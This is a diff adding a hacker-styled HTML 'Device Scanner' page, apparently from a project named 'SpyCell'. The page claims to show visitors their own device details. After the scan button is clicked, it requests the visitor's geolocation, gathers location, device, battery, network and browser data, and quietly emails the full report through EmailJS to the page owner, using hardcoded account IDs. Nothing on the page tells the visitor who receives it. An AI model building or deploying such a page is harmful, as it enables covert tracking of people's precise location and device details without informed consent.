@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Device Information</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  padding: 0;
+  background: radial-gradient(circle at top, #020b12, #000);
+  color: #00ffcc;
+  font-family: "Courier New", monospace;
+}
+
+a {
+  color: #00ffcc;
+  text-decoration: none;
+  display: flex;
+  justify-content: center;
+  margin: 15px;
+}
+
+h1 {
+  text-align: center;
+  letter-spacing: 2px;
+}
+
+button {
+  background: transparent;
+  color: #00ffcc;
+  border: 1px solid #00ffcc;
+  padding: 12px;
+  width: calc(100% - 40px);
+  margin: 20px;
+  font-family: inherit;
+  letter-spacing: 2px;
+  cursor: pointer;
+}
+
+button.loading {
+  pointer-events: none;
+  text-shadow: 0 0 10px #00ffcc;
+}
+
+button.loading::after {
+  content: " SCANNING";
+  animation: blink 1.2s infinite;
+}
+
+@keyframes blink {
+  50% { opacity: 0.2; }
+}
+
+button.locked {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+#status {
+  text-align: center;
+  font-size: 13px;
+  min-height: 18px;
+}
+
+#status.success { color: #00ffcc; }
+#status.error { color: #ff5f5f; }
+
+#details {
+  margin: 25px auto;
+  max-width: 600px;
+  background: rgba(0, 26, 26, 0.6);
+  border: 1px solid rgba(0,255,204,.4);
+  padding: 20px;
+  border-radius: 10px;
+  display: none;
+}
+
+#details p {
+  font-size: 14px;
+  border-bottom: 1px dashed rgba(0,255,204,.2);
+  padding: 6px 0;
+}
+</style>
+</head>
+
+<body>
+
+<a href="../index.html">⬅ BACK</a>
+
+<h1>DEVICE SCANNER</h1>
+
+<button id="getDetailsBtn">INITIATE SCAN</button>
+<div id="status"></div>
+
+<div id="details">
+
+  <button id="openMapBtn">Open in Google Maps</button>
+
+  <p><strong>Latitude:</strong> <span id="lat"></span></p>
+  <p><strong>Longitude:</strong> <span id="long"></span></p>
+  <p><strong>Device:</strong> <span id="devicemodel"></span></p>
+  <p><strong>OS:</strong> <span id="os"></span></p>
+  <p><strong>OS Version:</strong> <span id="osversion"></span></p>
+  <p><strong>Browser:</strong> <span id="browser"></span></p>
+  <p><strong>Battery:</strong> <span id="batterylevel"></span></p>
+  <p><strong>Charging:</strong> <span id="batterycharging"></span></p>
+  <p><strong>Network:</strong> <span id="network"></span></p>
+  <p><strong>RAM:</strong> <span id="ram"></span></p>
+  <p><strong>Storage:</strong> <span id="storage"></span></p>
+  <p><strong>Screen:</strong> <span id="screen"></span></p>
+  <p><strong>Language:</strong> <span id="language"></span></p>
+  <p><strong>Timezone:</strong> <span id="timezone"></span></p>
+</div>
+
+<script>
+emailjs.init("qpU9rhcIiteDcetie");
+
+const ua = navigator.userAgent;
+const btn = document.getElementById("getDetailsBtn");
+const statusEl = document.getElementById("status");
+
+let scanAlreadyDone = false;
+let lat, long;
+
+/* ===== HELPERS ===== */
+const getOS = () => {
+  if (/Android/i.test(ua)) return "Android";
+  if (/iPhone|iPad/i.test(ua)) return "iOS";
+  if (/Windows/i.test(ua)) return "Windows";
+  if (/Mac/i.test(ua)) return "macOS";
+  if (/Linux/i.test(ua)) return "Linux";
+  return "Unknown";
+};
+
+const getOSVersion = () => {
+  const m = ua.match(/(Android|OS|Windows NT|Mac OS X)\s([0-9._]+)/);
+  return m ? m[2].replace(/_/g,".") : "Unknown";
+};
+
+const getBrowser = () => {
+  if (ua.includes("Edg")) return "Edge";
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Safari")) return "Safari";
+  return "Unknown";
+};
+
+const getBattery = async () => {
+  if (!navigator.getBattery) return { level: "N/A", charging: "N/A" };
+  const b = await navigator.getBattery();
+  return {
+    level: Math.round(b.level * 100) + "%",
+    charging: b.charging ? "Yes" : "No"
+  };
+};
+
+/* ===== MAIN ===== */
+btn.onclick = async () => {
+  if (scanAlreadyDone) return;
+
+  scanAlreadyDone = true;
+  btn.classList.add("loading");
+  btn.textContent = "";
+
+  statusEl.textContent = "Requesting location…";
+
+  navigator.geolocation.getCurrentPosition(async pos => {
+    try {
+      lat = pos.coords.latitude;
+      long = pos.coords.longitude;
+
+      document.getElementById("lat").innerText = lat;
+      document.getElementById("long").innerText = long;
+
+      // Google Maps button
+      document.getElementById("openMapBtn").onclick = () => {
+        window.open(
+          `https://www.google.com/maps?q=${lat},${long}`,
+          "_blank"
+        );
+      };
+
+      const battery = await getBattery();
+      const storage = navigator.storage?.estimate
+        ? await navigator.storage.estimate()
+        : null;
+
+      const available = storage
+        ? ((storage.quota - storage.usage)/1e9).toFixed(2) + " GB"
+        : "N/A";
+
+      const deviceData = {
+        Map_Location: `https://www.google.com/maps?q=${lat},${long}`,
+        Latitude: lat,
+        Longitude: long,
+        Device: /Mobi/i.test(ua) ? "Mobile" : "Desktop",
+        OS: getOS(),
+        OS_Version: getOSVersion(),
+        Browser: getBrowser(),
+        Battery: battery.level,
+        Charging: battery.charging,
+        Network: navigator.connection?.effectiveType || "Unknown",
+        RAM: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+        Storage: available,
+        Screen: screen.width + " x " + screen.height,
+        Language: navigator.language,
+        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        UserAgent: ua,
+        Timestamp: new Date().toString()
+      };
+
+      document.getElementById("details").style.display = "block";
+
+      const payload =
+`===== DEVICE SCAN REPORT =====
+${Object.entries(deviceData).map(([k,v]) => `${k}: ${v}`).join("\n")}
+===== END REPORT =====`;
+
+      statusEl.textContent = "Transmitting payload…";
+
+      await emailjs.send(
+        "service_s5vx7yl",
+        "template_fq9lhw7",
+        {
+        project: "SpyCell 🕵️", page: "Device Info", 
+        message: payload, 
+        date: new Date().toLocaleDateString(), 
+        time: new Date().toLocaleTimeString()
+        }
+      );
+
+      statusEl.textContent = "SCAN COMPLETE";
+      statusEl.className = "success";
+
+    } catch {
+      statusEl.textContent = "SYSTEM FAILURE";
+      statusEl.className = "error";
+    } finally {
+      btn.classList.remove("loading");
+      btn.classList.add("locked");
+      btn.textContent = "SCAN LOCKED";
+      btn.disabled = true;
+    }
+  }, () => {
+    statusEl.textContent = "LOCATION DENIED";
+    statusEl.className = "error";
+  });
+};
+</script>
+
+</body>
+</html>
